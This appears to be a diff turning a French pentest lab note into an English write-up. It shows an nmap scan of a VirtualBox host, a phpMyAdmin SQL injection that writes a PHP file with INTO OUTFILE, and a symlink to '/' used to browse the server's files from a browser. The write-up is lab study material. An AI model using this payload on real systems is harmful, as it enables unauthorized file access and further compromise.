@@ -1,6 +1,8 @@
-vie nmap on apprend que le server tourne sur Apache 2.2.22
+# Apache 2.2.22 Local File Disclosure via Symbolic Link
 
-```bash 
+Using `nmap`, we discovered that the target machine is running an outdated version of Apache:
+
+```bash
 ┌──(jdamoise㉿kali)-[~]
 └─$ nmap -sV 192.168.56.101
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 10:35 EDT
@@ -16,26 +18,32 @@ PORT    STATE SERVICE  VERSION
 993/tcp open  ssl/imap Dovecot imapd
 MAC Address: 08:00:27:6D:D3:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds
-
 ```
 
-dans cette version il y a une faille nous premaitant d'acceder a la racine du server via une page sur le navigateur 
+The Apache version 2.2.22 is known to have vulnerabilities, particularly in how it handles symbolic links under certain configurations. If the web server is configured to allow PHP file uploads and the `open_basedir` restriction is not in place, it becomes possible to create a symbolic link pointing to the root directory `/` — thereby exposing the entire filesystem via the web browser.
 
-via un __symlink("/", "path.php")__ qui est un lien symbolic du __path.php__ vers __/__
-on peux acceder au __/__ depuis le navigateur
+### Exploitation via phpMyAdmin SQL Injection
 
-pour ce faire on execute une injection SQL sur phpmyadmin 
+In this case, we leverage SQL injection through phpMyAdmin to create a malicious PHP file that creates the symbolic link. The SQL payload is as follows:
 
 ```sql
-SELECT 1, '<?php symlink("/", "paths.php");?>' INTO OUTFILE '/var/www/forum/templates_c/run.php';
-
+SELECT 1, '<?php symlink("/", "paths.php"); ?>' INTO OUTFILE '/var/www/forum/templates_c/run.php';
 ```
 
-Cette injection vas nous permetre depuis la route /forum/templates_c/run.php
+This command writes a PHP file (`run.php`) into the web-accessible `templates_c` directory. When this script is executed, it will create a symbolic link named `paths.php` pointing to the root directory `/`.
 
-de creer le lien symbolic
+### Gaining Access to the Root Filesystem
 
-il nous reste plus cas acceder a /forum/templates_c/paths.php pour recuperer tout le __/__
+Once the symlink is in place, we trigger the script by visiting the following URL in the browser:
+
+```
+http://192.168.56.101/forum/templates_c/run.php
+```
+
+After the symbolic link is created, we can browse the contents of the root filesystem simply by accessing:
+
+```
+http://192.168.56.101/forum/templates_c/paths.php
+```
+
+This effectively allows us to navigate the entire server file system from the web browser, exposing sensitive files such as `/etc/passwd`, `/var/www`, and more — potentially leading to privilege escalation or further exploitation.
